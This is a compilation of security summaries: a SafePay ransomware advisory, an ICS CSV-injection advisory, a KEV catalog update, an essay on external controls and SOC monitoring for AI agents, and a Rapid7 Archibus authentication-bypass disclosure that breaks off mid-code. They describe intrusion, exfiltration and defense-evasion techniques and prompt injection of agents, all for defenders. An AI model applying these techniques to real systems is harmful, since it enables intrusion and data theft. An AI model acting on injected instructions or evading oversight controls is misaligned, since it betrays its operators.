summary: Advisory at a Glance Title #StopRansomware: SafePay Ransomware Original Publication October 20, 2026 Executive Summary This advisory details recent activity by the SafePay ransomware group. SafePay actors have been highly active since August 2024, targeting businesses and critical infrastructure across North America, South America, Europe, and Australia. SafePay actors typically gain access to networks by stealing or guessing passwords, exploiting vulnerabilities in security systems, and using phishing tactics. Once inside the network, SafePay actors establish control by creating new accounts or taking over existing ones. They then use legitimate system tools to move through the network, identify valuable files, and disable security protections to avoid detection. Next, they encrypt the victim’s files, making them inaccessible, and leave a ransom note demanding payment in cryptocurrency. This advisory urges organizations to follow recommended security measures to reduce the risk and impact of SafePay ransomware attacks. Affected Products CVE-2020-3259 [ Common Weakness Enumeration (CWE)-200: Exposure of Sensitive Information to an Unauthorized Actor ] CVE-2023-20269 [ CWE-288: Authentication Bypass Using an Alternate Path or Channel ] CVE-2023-27532 [ CWE-306: Missing Authentication for Critical Function ] CVE-2024-40711 [ CWE-502: Deserialization of Untrusted Data ] CVE-2024-40766 [ CWE-284: Improper Access Control ] Key Actions Regularly patch and update systems, especially firewalls, and other edge devices. Implement Zero Trust Principle. Restrict administrative tools and privileges to necessary users only. Strengthen account security by implementing identity, credential, and access management (ICAM) policies and multifactor authentication (MFA). Indicators of Compromise For a downloadable copy of indicators of compromise, see: AA26-293A STIX XML (40 KB) AA26-293A STIX JSON (38 KB) Intended Audience Organizations: Government; Federal Civilian Executive Branch (FCEB); State, Local, Tribal, and Territorial (SLTT); Critical Infrastructure Roles: Defensive cybersecurity analysts , vulnerability analysts , security systems managers , and operational technology (OT) owners and operators Introduction Note: This joint Cybersecurity Advisory is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources. The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), United States Secret Service (USSS), Germany’s Landeskriminalamt Rheinland-Pfalz, the United Kingdom’s National Crime Agency, and the United Kingdom’s North West Regional Organised Crime Unit—hereafter referred to as the authoring agencies—are releasing this joint advisory to disseminate known SafePay ransomware TTPs and IOCs identified through FBI, USSS, and Landeskriminalamt Rheinland-Pfalz investigations as recently as August 2026. Since August 2024, SafePay ransomware group’s operations have affected a wide range of businesses and critical infrastructure in North America, South America, Europe, and Australia. SafePay ransomware was among the most active ransomware groups in 2026. The SafePay threat actors have impacted at least 600 separate victims from multiple critical infrastructure sectors. The authoring agencies encourage organizations to implement the recommendations in the Mitigations section of this advisory to reduce the likelihood and impact of SafePay ransomware incidents. Download the PDF version of this report: #StopRansomware: SafePay Ransomware (PDF, 1.06 MB ) For a downloadable copy of IOCs, see: AA26-293A-STIX XML (XML, 40.23 KB ) AA26-293A-STIX JSON (JSON, 37.49 KB ) Technical Details Note: This advisory uses the MITRE ATT&CK ® Matrix for Enterprise framework, version 20. See MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. Initial Access The FBI, USSS, and cybersecurity researchers observed SafePay threat actors obtaining initial access [ TA0001 ] to organizations through various means, including credential exposure, implementing brute force password attacks [ T1110 ], and exploiting virtual private network (VPN) access. SafePay threat actors use the IP addresses of the VPN provider “Mullvad” to attain initial access—specifically, SafePay threat actors use phished account profiles to access victim networks to exploit the following known Common Vulnerabilities and Exposures (CVEs) for edge device products: CVE-2020-3259 [ Common Weakness Enumeration (CWE)-200: Exposure of Sensitive Information to an Unauthorized Actor ] CVE-2023-20269 [ CWE-288: Authentication Bypass Using an Alternate Path or Channel ] Additionally, the authoring agencies observed SafePay threat actors exploiting the following vulnerabilities across internet-exposed systems [ T1190 ] for initial access through automated scripts: CVE-2023-27532 [ CWE-306: Missing Authentication for Critical Function ] CVE-2024-40711 [ CWE-502: Deserialization of Untrusted Data ] CVE-2024-40766 [ CWE-284: Improper Access Control ] Execution, Persistence, Stealth, and Defense Impairment After SafePay threat actors gain access to a victim network, they establish persistence by gaining administrative privileges on existing accounts [ T1098 ], or on newly created accounts [ T1136 ], using built-in administrative tools consistent with living off the land (LOTL) techniques. Once SafePay threat actors establish a foothold in a victim’s network, they use LOTL binaries (LOLBins) [ T1218 ], such as PsExec [ T1021.002 ] and Windows Remote Management (WinRM) [ T1021.006 ], to execute commands on remote systems. In several instances, SafePay threat actors used ShareFinder.ps1 —a PowerShell script function used for enumerating network file shares in Windows Active Directory environments—to identify valuable assets for exfiltration [ T1059.001 , T1059.003 ]. Additionally, SafePay threat actors used SharpShares.exe , a tool used to identify and enumerate network file shares. As SafePay threat actors prepare for lateral movement, they commonly disable security software [ T1685 ] to avoid detection. In some cases, the threat actors changed the passwords of system users, making valid logins impossible. SafePay threat actors have also been observed using software packing or virtual machine software protection to conceal their code [ T1027.002 ]. Privilege Escalation The authoring agencies observed SafePay threat actors using a User Account Control (UAC) Bypass Privilege Escalation technique [ T1548.002 ] that creates an elevated process through a specified component object model, enabling the execution of malicious commands or binaries [ T1059 ]. SafePay threat actors have also been observed using token impersonation methods [ T1134.001 ]. Lateral Movement To pivot laterally through a network and identify files for exfiltration [ TA0010 ] and encryption, SafePay threat actors use legitimate tools like PsExec, WinRM, and Remote Management and Monitoring [ T1569.002 ] software. They also employ Remote Desktop Protocol (RDP) [ T1021.001 , T1133 ] to expand their presence within the compromised network [ T1021 ]. As SafePay threat actors move laterally through a network, they look for credentials to gain admin access and will create accounts, if needed. Collection, Exfiltration, and Impact SafePay threat actors use legitimate tools, such as FileZilla, 7-Zip, RClone, and WinRAR to compress files and collect data [ T1560.001 ], and WinSCP and RClone to facilitate the exfiltration of data [ T1048 ] from the compromised network to actor-controlled accounts. In some instances, SafePay threat actors use OneDrive to exfiltrate data [ T1567 ]. In other instances, the SafePay threat actors installed legitimate remote desktop tools like AnyDesk or TeamViewer on the victim’s systems. SafePay threat actors use these tools to transfer ransomware and other software onto a victim’s system. Additionally, SafePay threat actors halt the Volume Shadow Copy Service and reset Network Attached Storage containing victim backup data to initial factory settings to inhibit system recovery attempts [ T1490 ]. Following exfiltration, SafePay threat actors encrypt files [ T1486 ] using a sophisticated hybrid encryption scheme to lock data. This involves combining a ChaCha20 stream cipher with an RSA public-key cryptosystem for a fast and secure key exchange. This multilayered approach customizes encryption methods based on file type and size and enables full or partial encryption. Data encrypted with the SafePay ransomware variant (appended with .SafePay ) cannot be recovered without the decryption key. SafePay threat actors hold the encrypted data for ransom and typically demand a subset of company revenue in cryptocurrency in exchange for decryption software. SafePay threat actors leave a ransom note on the victim’s system, typically on the desktop or root directory, advising them that SafePay locked their system and to reach out over a chat portal at a TOR .onion website link with a victim ID as the login. To put pressure on the victim, a representative makes phone calls on behalf of the ransomware group. If the victim does not pay, SafePay posts the exfiltrated data to their SafePay leak website, which is linked in the ransom note. Following encryption, SafePay may delete itself from the victim’s filesystem [ T1070.004 ]. Leveraged Tools Table 1 lists publicly available tools and applications used by SafePay threat actors, including legitimate tools repurposed for their operations. Note: These tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control. Table 1. Tools Leveraged by SafePay Threat Actors Tool Name Description 7-Zip An open source software that enables users to compress various file formats. SafePay threat actors maliciously use 7-Zip for data packaging and movement. FileZilla An open source client that enables users to transfer files between servers. SafePay threat actors use FileZilla maliciously for data exfiltration. Mimikatz A credential dumper that enables users to view and save authentication credentials, such as Kerberos tickets [ T1550.002 ]. SafePay threat actors use Mimikatz for password exfiltration. PowerShell A cross-platform task automation solution used for various malicious activities, including command execution. It is composed of a command-line shell, a scripting language, and a configuration management framework—which runs on Windows, Linux, and macOS. PsExec A tool designed to run programs that SafePay threat actors use to execute commands on remote systems. RClone A legitimate command-line program used to sync files with cloud storage services, such as Mega. SafePay threat actors maliciously use RClone for data packaging and movement. ScreenConnect A remote support, access, and meeting software that allows users to control devices remotely over the internet. SafePay threat actors use ScreenConnect for persistence and access. ShareFinder.ps1 A PowerShell script used to scan an Active Directory network for shared folders. SafePay threat actors use ShareFinder.ps1 for exfiltration hunting. WinRAR Archive utility used to split compromised data into segments and to compress [ T1560.001 ] files into a .RAR format prior to exfiltration. SafePay threat actors use WinRAR for data packaging and movement. WinRM A Windows-based protocol designed to facilitate remote management and automation. SafePay threat actors use WinRM for command execution. AnyDesk and TeamViewer Legitimate remote desktop tool used for accessing and controlling computers over the internet. SafePay threat actors use AnyDesk and TeamViewer to transfer malware to the victim’s system. AcronisDiskDirector A legitimate disk management tool. SharpShares.exe A network scanning tool used for host discovery and enumeration. NetExec A legitimate network assessment tool to enumerate systems, validate credentials, and manage remote operations across private networks. Backblaze A command-line tool for file management within Backblaze B2 cloud storage. SafePay threat actors executed commands via b2.exe to exfiltrate a victim’s data. Indicators of Compromise Table 2 through Table 5 list IOCs associated with SafePay ransomware that allowed for the identification of malicious activity. Disclaimer: The authoring agencies recommend organizations investigate or verify IP addresses prior to taking action, such as blocking. These IOCs were observed between November 2024 and August 2026. The authoring organizations recommend organizations investigate or verify tool use prior to taking action, such as blocking. Table 3. Malicious Files Filename Description 1 - Copy.bat A batch script likely used to copy, stage, or move files during lateral movement or data collection. DYRasWtb.exe A suspected malicious executable. libsmb2.dll A library associated with Server Message Block (SMB) communication; may support lateral movement or file transfer. Incident Response If a potential compromise is detected, but ransomware actors have not (yet) encrypted items, organizations should take the following actions: Determine which hosts were compromised and isolate them by quarantining or taking them offline. Initiate threat hunting activities to scope the intrusion . Collect and review relevant artifacts, logs, and other data to identify threat actor TTPs, compromised devices and accounts, a timeline of activity, etc. Report the suspected compromise to the FBI and other agencies as appropriate (if located within the U.K., report the compromise to Report Fraud or local police force ) (see the Reporting section for contact information). Apply eviction countermeasures , including those listed below, to contain the incident and eradicate the threat actor from the network ( Note: Start applying countermeasures after collecting enough threat hunting data to inform effective countermeasure selection; this will likely overlap with threat hunting activities). Use CISA’s Eviction Strategies Tool to assemble countermeasures for a systematic eviction plan—the tool comprises Playbook-NG (a web application) and COUN7ER (a database of post-compromise countermeasures mapped to adversary TTPs). Use Playbook-NG and COUN7ER together to assemble a systematic eviction plan, or playbook, that leverages distinct countermeasures to contain and evict cyber threat actors. The playbook features a list of recommended response actions based on threat actor TTPs and includes each action’s intended outcome, preparatory steps, and associated risks. For more information, see CISA’s Eviction Strategies Tool fact sheet. Harden the network to prevent additional malicious activity (see Mitigations for guidance). If compromise is detected and items have been encrypted, see the “Ransomware and Data Extortion Response Checklist” in CISA’s joint #StopRansomware Guide . Mitigations The authoring agencies recommend organizations implement the mitigations below to improve their cybersecurity posture on the basis of the threat actors’ activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s CPGs webpage for more information on the CPGs, including additional recommended baseline protections. Organizations should implement the following mitigations: Prioritize remediating known exploited vulnerabilities (KEVs) and keep all operating systems, software, and firmware up to date , as timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats; specifically, prioritize patching KEVs in internet-facing systems. [ CPG 2.B ]. Additionally, using Binding Operational Directive 26-04 offers a framework for patch prioritization based on technology type and steps for forensics triage. Under its implementation guidance, it offers guidance and steps to perform forensic triage for severe vulnerability cases. Implement identity, credential, and access management (ICAM) policies across the organization and require MFA for all services to the greatest extent possible—particularly for webmail, VPNs, and accounts that access critical systems [ CPG 3.F ]. Require all accounts with password logins (e.g., service accounts, admin accounts, and domain admin accounts) to comply with NIST’s digital identity guidelines ; require employees to use long passwords and consider not requiring recurring password changes, as these can weaken security [ CPG 3.B ]. Use longer passwords consisting of at least 15 characters and no more than 64 characters in length. Store passwords in a hashed format using industry-recognized password managers. Add password user “salts” to shared login credentials. Avoid reusing passwords [ CPG 3.C ]. Implement multiple failed login attempt account lockouts [ CPG 3.E ]. Disable password “hints.” Refrain from requiring password changes more frequently than once per year. Note: NIST guidance suggests favoring longer passwords instead of requiring frequent password resets. Frequent password resets are more likely to result in users developing password patterns cyber threat actors can easily decipher. Maintain offline backups of data and regularly test and maintain backup and restoration processes [ CPG 3.O ]; implementing this practice helps organizations avoid severe operational interruptions and prevents scenarios in which data is irretrievable. Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [ CPG 3.K ]. Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drives, storage devices, or the cloud) [ CPG 3.I , 3.O , 1.C ]. Segment networks to prevent the spread of ransomware, as network segmentation can help control traffic flows between, and access to, various subnetworks and restrict adversary lateral movement [ CPG 3.I ]. Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a network monitoring tool [ CPG 4.B ]. To aid in detecting ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint Detection and Response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host. Filter network traffic by preventing unknown or untrusted origins from accessing remote services on internal systems—this prevents threat actors from directly connecting to remote access services that they have established for persistence. Review domain controllers, servers, workstations, and Active Directories for new, unactive and/or unrecognized accounts. Disable unused ports . Consider adding an email banner to emails received from outside of your organization. Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege [ CPG 3.G ]. Implement time-based access for accounts set at the admin level and higher ; for example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust Maturity Model ). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. Disable command-line and scripting activities and permissions, since privilege escalation and lateral movement often depend on software utilities running from the command line; if threat actors cannot run these tools, they will have difficulty escalating privileges and moving laterally [ CPG 3.M ]. These mitigations align with principles provided in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software . CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By implementing secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to make additional configuration changes, purchasing product security add-in software and logs, monitoring, and making frequent security updates. Validate Security Controls In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. To get started: Select an ATT&CK technique described in this advisory (see Table 6 to Table 16 ). Align your security technologies against the technique. Test your technologies against the technique. Analyze your detection and prevention technologies’ performance. Repeat the process for all security technologies to obtain a set of comprehensive performance data. Tune your security program, including people, processes, and technologies, based on the data generated by this process. The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory. Resources Stopransomware.gov is a whole-of-government approach that provides one central location for ransomware resources and alerts. CISA’s #StopRansomware Guide provides organizations with comprehensive best practices to mitigate the risk of ransomware attacks. CISA’s Known Exploited Vulnerabilities Catalog is an authoritative resource for organizations to support improvement of their patch management best practices. CISA’s Multifactor Authentication webpage provides best practices for network defenders to mitigate threats to accounts and systems that use MFA. CISA’s Cyber Hygiene Services help organizations reduce the risk of a successful cyberattack. USSS’s Preparing for a Cyber Incident outlines basic steps an organization can take before, during, and after a cyber incident. CISA’s Cyber Security Evaluation Tool (CSET) provides a systematic, disciplined, and repeatable approach for evaluating an organization’s security posture; see Downloading and Installing CSET for step-by-step guidance to help your organization evaluate cybersecurity practices on your networks. CISA’s Ransomware Risk Assessment helps assess an organization’s ability to counteract a ransomware infection. Department of Health and Human Services’ Cybersecurity Performance Goals is a resource to help healthcare organizations implement high-impact cybersecurity practices. CISA’s Binding Operational Directive 26-04: Prioritizing Security Updates Based on Risk and its implementation guidance CISA’s CI Fortify: Strengthening Resilience Across Critical Infrastructure CISA’s Eviction Strategies Tool enables incident response teams to quickly turn observed behaviors into remediation plans U.K.’s National Cyber Security Centre U.K.’s National Crime Agency Reporting Your organization has no obligation to respond or provide information to the FBI and other authoring agencies in response to this joint advisory. If, after reviewing the information provided, your organization decides to provide information to the FBI or other authoring agencies, reporting must be consistent with applicable state and federal laws. The FBI and other authoring agencies are interested in any information, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. Additional details of interest include a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators. The authoring agencies do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s Internet Crime Complaint Center (IC3) , a local FBI field office , a local USSS Field Office , or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center ( contact@cisa.dhs.gov ) or by calling 1-844-Say-CISA (1-844-729-2472). In the U.K., report incidents of a cybercrime or fraud at the UK’s Home for Reporting Cyber Crime & Fraud or 0300-123-2040, your local police force , or use the non-emergency number 101. Disclaimer The information in this report is being provided “as is” for informational purposes only. CISA and the FBI/USSS do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI, CISA, or USSS. The authoring agencies recognize that infrastructure used for malicious activity may be hosted on cloud or virtualized platforms where IP addresses can be dynamically or temporarily assigned. As a result, an address associated with malicious activity at one point in time may later be reassigned to benign services. Accordingly, these indicators should be interpreted as historically observed infrastructure within the activity window and should be corroborated with current network telemetry or additional intelligence sources when used for defensive or investigative purposes. summary_excerpt: Advisory at a Glance Title #StopRansomware: SafePay Ransomware Original Publication October 20, 2026 Executive Summary This advisory details recent activity by the SafePay ransomware group. SafePay actors have been highly active since August 2024, targeting businesses and critical infrastructure across North America, South America, Europe, and Australia. SafePay actors typically gain access to networks by stealing or guessing passwords, exploiting vulnerabilities in security systems, and using phishing tactics. Once inside the network, SafePay actors establish control by creating new accounts

General Mitigation Factors Recommended security practices and firewall configurations can help protect a process control network from attacks that originate from outside the network. Such practices include that process control systems are physically protected from direct access by unauthorized personnel, have no direct connections to the Internet, and are separated from other networks by means of a firewall system that has a minimal number of ports exposed, and others that have to be evaluated case by case. Process control systems should not be used for Internet surfing, instant messaging, or receiving e-mails. Portable computers and removable storage media should be carefully scanned for viruses before they are connected to a control system. Proper password policies and processes should be followed. Additional information on Industrial Control Systems Cybersecurity Best Practices can be found in the Hitachi Energy “Industrial Control Systems Cybersecurity Best Practices” Cybersecurity Notification. Locate control system networks and remote devices behind firewalls and isolate them from business networks. When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most recent version available. Also recognize VPN is only as secure as its connected devices. CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures. summary: View CSAF Summary Hitachi Energy is aware of multiple vulnerabilities that affect MicroSCADA X SYS600 product versions listed in this document. These vulnerabilities can be exploited to carry out various attacks on the product. Please refer to the Recommended Immediate Actions for information about the mitigation/remediation. The following versions of Hitachi Energy MicroSCADA X SYS600 Product are affected: MicroSCADA X SYS600 vers:MicroSCADA_X_SYS600/<=10.7, 10.8 (CVE-2026-9852, CVE-2026-9853, CVE-2026-9854, CVE-2026-9853) CVSS Vendor Equipment v3 7.8 Hitachi Energy MicroSCADA X SYS600 2 Vulnerabilities Improper Neutralization of Formula Elements in a CSV File, Incorrect Implementation of Authentication Algorithm Background Critical Infrastructure Sectors: Energy Countries/Areas Deployed: Worldwide Company Headquarters Location: Switzerland Vulnerabilities Expand All + CVE-2026-9852 A CSV injection vulnerability exists in SYS600. Injected malicious formulas can add or modify data to the spreadsheet, insert links, exfiltrate data, and in some cases, depending on how the user has their environment configured, execute malicious code on the user’s machine. To exploit this issue attackers would need a way to create arbitrary log messages. This could be achieved through normal functionality via SCIL scripts, a log injection vulnerability, or via the SYS600 broker. This vulnerability affects all Windows users regardless of their privilege level who can run the Notify service and export the log. Recommended Practices CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities. Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet. Locate control system networks and remote devices behind firewalls and isolating them from business networks. When remote access is required, use more secure methods, such as virtual private networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices. CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures. CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies. Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents. CISA also recommends users take the following measures to protect themselves from social engineering attacks: Do not click web links or open attachments in unsolicited email messages. summary: CISA has added six new vulnerabilities to its Known Exploited Vulnerabilities (KEV) Catalog , based on evidence of active exploitation. CVE-2026-96652 Plex Media Server Server-Side Request Forgery (SSRF) Vulnerability CVE-2026-96654 Plex Media Server Improper Neutralization of Encoded URI Schemes in a Web Page Vulnerability CVE-2026-96655 Plex Media Server Server-Side Request Forgery (SSRF) Vulnerability CVE-2026-96656 Plex Media Server External Control of File Name or Path Vulnerability CVE-2026-106931 EG Secure Solutions SiteGuard Server Edition OS Command Injection Vulnerability CVE-2026-110936 Siemens Software Center Uncontrolled Search Path Element Vulnerability These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise. Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied. While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities . CISA will continue to add vulnerabilities to the catalog that meet the specified criteria . Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form . Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

summary: Why the controls on an AI agent have to live outside of it, and what a security operations team can do to implement and maintain those controls. The new privileged user in your environment Security teams spent two decades learning how to work with the people they trust most. Domain admins, DBAs, finance approvers and contractors with VPN access all get a mature playbook: verified identity, scoped access, logged activity and a fast way to revoke it all. Today, we’re navigating the same kind of access with regard to AI agents. They read our mailboxes, query our data lakes, open tickets, push code and increasingly, act on production systems. Unlike a new hire, an agent can’t be interviewed, background-checked or made to sign an acceptable-use policy. The industry has largely settled on one framing: AI agents are the new insider threat but that label only tells us half of the story. It tells us who to worry about, not where the controls should sit. Our argument is that the answer is a security idea from 1972, the reference monitor, and that the SOC is where it gets enforced in practice. Why agents break the trust model we had With traditional software, a security incident ends in a root cause. You find the vulnerable function, the misconfigured rule or the bad commit, and you fix it. The behavior lived in code we could read. Large language models don't give us that. We can't point to the training example or the set of weights that produced a specific decision. The same prompt can produce different actions on different runs. For a defender, that removes the most basic assumption we rely on: that the system will do tomorrow what it did today. The attack surface changes too, and computer science has an old name for this problem: the confused deputy . This is a trusted program tricked into misusing its own authority on someone else's behalf. An agent that reads a poisoned email, web page or document and then acts on hidden instructions is a confused deputy with API keys. No password is stolen and no exploit fires, which makes the agent's permissions the real blast radius, not the model's intelligence. Where the insider analogy holds, and where it breaks Most discussion of agents as insiders focuses on two gaps: agents have no career to lose, and they act at machine speed. Both are real. From a detection and forensics seat, though, four other differences change the work more: Difference Human insider AI agent What it means for defenders Monoculture One person fails on their own Many identical copies share one weakness Treat a working injection like a wormable bug: fix the fleet, not one instance Replayability Events can be reconstructed and the person interviewed The same input can produce a different action on a rerun Forensics must rest on recorded inputs and tool calls, not on replaying the agent Command channel Instructions come from a manager Instructions arrive mixed in with the data it processes Any content the agent reads is a potential command Self-report A person can be questioned and cross-checked Its account of its reasoning may not match what it did Evidence must come from outside the agent The last row matters most. We can't make an agent's self-reported reasoning the basis of trust, because we don't yet know how to guarantee that reasoning is faithful. Evidence has to come from outside the agent. Put the controls outside the model If the model can't be fully trusted, the controls that govern it can't live inside of it. A system prompt that says "never delete production data" is a suggestion, not a control. A well-crafted injection can talk the model out of it. Security architects solved a version of this problem in the 1970s with the reference monitor: a mechanism that checks every access request, can't be bypassed and can't be tampered with by the program it governs. For AI agents, that means separating three things: the model that reasons, the harness that orchestrates it and the policy layer that decides which actions are actually allowed. Figure 1: Agent control architecture · enforcement outside the model The agent can propose anything, but only the enforcement point decides what reaches real systems, and every decision lands in a log the agent can't alter. A security playbook for AI agents None of these controls are new. What's new is applying them consistently to a non-human actor that reasons, plans and acts. Give every agent its own identity. An agent should never run under a shared service account or a person's own credentials. It needs an identity that can be scoped, monitored, and revoked independently. Enforce least privilege on actions, not just data. Define an explicit action space: which tools, which APIs, which parameters. High-impact actions like payments, deletions or production changes need step-up approval from a human. Log everything in a place the agent can't touch. Every tool call, input, and output goes to tamper-evident storage outside the agent's reach. You should be able to reconstruct what happened without asking the agent. Never let a model grade its own work. Use a different model, a deterministic rule, or a human to verify important outcomes. Avoid depending on a single model vendor for anything critical. Red team continuously. Test prompt injection, tool misuse, data exfiltration, and edge cases, not just the happy path. Re-test every time the model, the prompt, or the tool set changes. Build a kill switch before you need it. In May 2017, WannaCry was stopped by luck. A researcher registered a nonsense domain hard-coded in the ransomware, and new infections stopped spreading because the malware checked that domain before running. Defenders didn't build that kill switch. They found it in the attacker's code, it did nothing for machines already encrypted, and later variants simply removed it. Agent fleets can't depend on that kind of luck. The stop control has to be ours, sit outside the agent, cut off its credentials and tool access mid-run, and be tested regularly, the way an EDR host isolation action is. Disclose and share incidents. When an agent misbehaves, tell the people affected, document which control failed and share the lessons with the wider community, the same way we share threat intelligence today. Persistent memory is a new risk. Agents with long-term memory can be poisoned once and stay compromised. Add memory state to "log everything" and "quarantine its outputs." Bring agents into the Security Operations Center (SOC) Logging alone doesn't protect anyone, as no human team can review millions of agent actions, and handing that review to another unsupervised model just adds another black box. The SOC needs to treat agent activity as a first-class telemetry source, the way it treats endpoints, identities and cloud workloads today. In practice, that means: Behavioral baselines per agent. Know which tools, data sources and destinations each agent normally uses, and alert on deviations, such as a code-review agent that starts reading the finance file share. Detections for agent-specific attacks. Write rules for prompt-injection indicators, unusual tool chaining, sudden bursts of high-privilege actions and data flowing to unexpected destinations. Correlation with the rest of the environment. Tie agent actions to the user, the session, the content the agent read, and the systems it touched, so an investigation can follow the full chain. Response playbooks. Pause the agent, revoke its tokens, quarantine its outputs and roll back its changes, with the same speed we expect when isolating a compromised host. The security industry can lead in this area, as we already know how to collect noisy telemetry, find the signal, and contain threats quickly. Agents are the next category of asset to protect, and the next category of actor to watch. Trust the architecture, not the model Models will keep getting smarter, and vendors will keep promising they're safer. Both may be true, but neither removes our responsibility for what an agent does inside our environment with our data and our credentials. The goal isn't to find a model we can trust completely. It's to build a system that stays safe even when the model gets it wrong. Security teams have done this for people, networks, and endpoints for decades. AI agents are simply the next privileged insider, and it's time we treated them that way.

summary: Overview While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered three new vulnerabilities in Eptura Archibus . A legacy API endpoint could be exploited to bypass authentication and run various functions without authentication ( CVSS: 8.6 High ). The most serious functions allow for full database read ( CVSS: 8.5 High ) and an insecure file upload ( CVSS: 9.6 Critical ). The insecure file upload leads to remote code execution. Product description Archibus helps organizations administer and manage their physical buildings, equipment, and real estate from a single central location. Users can track assets, maintenance work orders, real estate lease information, and desk or room reservations. According to Eptura , in 2023 over 16,000 companies and 40% of the Fortune 500 used Archibus. Impact A malicious actor with network access to the server via HTTP can read secrets and passwords out of the database. They can also run code to execute system commands as ‘NT AUTHORITY/Local Service’ and gain control of the server. Credit This vulnerability was discovered by Marcus Chang, Security Consultant at Rapid7 and is being disclosed in accordance with Rapid7's vulnerability disclosure policy . CVE-2026-107186 - Archibus Authentication Bypass The Archibus Web Central web application uses Java Direct Web Remoting (DWR) for various API functionality, which allows requests with multiple method calls. The isPasswordUppercase method sets a system session in the thread, and the runWorkflowRule method gets the set session for authentication. This allows malicious actors to run seemingly any workflow rule without providing authentication. Rapid7 tested the AbCommonResources-writeHTMLtoFile and AbCommonResources-getDataRecords workflow rules. Technical Analysis Most DWR methods require auth and DWR allows you to make multiple calls in a single request by editing the callCount parameter and adding other method parameters to the request. DWR processes multiple calls in a single batch sequentially on the same thread. The SecurityServiceImpl.isPasswordUppercase() method is whitelisted for pre-auth access, and internally calls loadTableDef() which sets the core system user session on the thread-local ContextStore: // SecurityServiceImpl.java - loadTableDef() private TableDef.ThreadSafe loadTableDef(String projectId, final String tableName) { Context context = ContextStore.get(); final Project.Immutable project = configManager.findProject(projectId); UserSession.Immutable coreUserSession = project.loadCoreUserSession(); context.setUserSession(coreUserSession); // <-- sets privileged session on context // ... } DWRWorkflowService.runWorkflowRule() uses the privileged context set by isPasswordUppercase . If getUserSession() was invalid, it returns a session timeout, otherwise it continues execution. The end result is the workflow of the users choosing running without the user providing any authentication: // DWRWorkflowService.java - runWorkflowRule() ContextCacheable.Immutable targetContext = ContextStore.get().getUserSession(); // ... if (targetContext == null) { handleSessionTimeout(workflowRuleName, 